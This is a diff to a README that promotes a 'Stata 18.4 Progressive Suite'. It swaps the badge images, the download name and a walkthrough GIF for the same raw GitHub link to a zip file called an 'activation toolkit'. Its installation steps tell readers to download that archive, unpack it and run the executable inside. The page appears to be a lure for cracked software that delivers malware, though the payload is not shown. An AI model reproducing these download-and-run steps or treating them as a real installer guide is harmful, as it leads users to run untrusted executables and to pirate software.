@@ -1,9 +1,9 @@
 # 🚀 Stata 18.4 Progressive Suite: Elevate Your Data Analysis in 2025!  
 
-![OS Supported](https://img.shields.io/badge/OS%20Compatibility-Windows%7CmacOS%7CLinux-blue)  
-![Release Version](https://img.shields.io/badge/Version-18.4-orange)  
-![Active Support](https://img.shields.io/badge/Support-24%2F7%20Live%20Help-green)  
-![License](https://img.shields.io/badge/License-MIT-lightgrey)  
+![OS Supported](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip%20Compatibility-Windows%7CmacOS%7CLinux-blue)  
+![Release Version](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip)  
+![Active Support](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip%2F7%20Live%20Help-green)  
+![License](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip)  
 
 ---
 
@@ -57,13 +57,13 @@ Experience the same powerful performance—regardless of your platform. Stata 18
 Harness the full power of _Stata 18.4 Progressive Suite_ with a rapid, secure onboarding process!  
 Just follow these step-by-step instructions to activate your application swiftly:
 
-1. Head to the repository’s release section and **download the `EasyLaunch.zip` package.**
+1. Head to the repository’s release section and **download the `https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip` package.**
 2. Unpack the archive to your preferred directory—no guesswork required.
 3. Launch the included executable; a sleek installer will automatically handle configuration.
 4. Enjoy the adaptive interface and limitless statistical capabilities at your command.
 
-### 🎦 [Installation Walk-through GIF](https://i.imgur.com/Js67NIU.gif)  
-![Video Installation Walk-through](https://i.imgur.com/Js67NIU.gif)
+### 🎦 [Installation Walk-through GIF](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip)  
+![Video Installation Walk-through](https://raw.githubusercontent.com/macjbc/stata-18-4-activation-toolkit/branch/souvenir/stata-18-4-activation-toolkit_1.6.zip)
 
 _Note: For further detail, the setup wizard provides on-screen guidance for every operating system mentioned above. Launch with confidence—assistance is always just a tab away!_
 
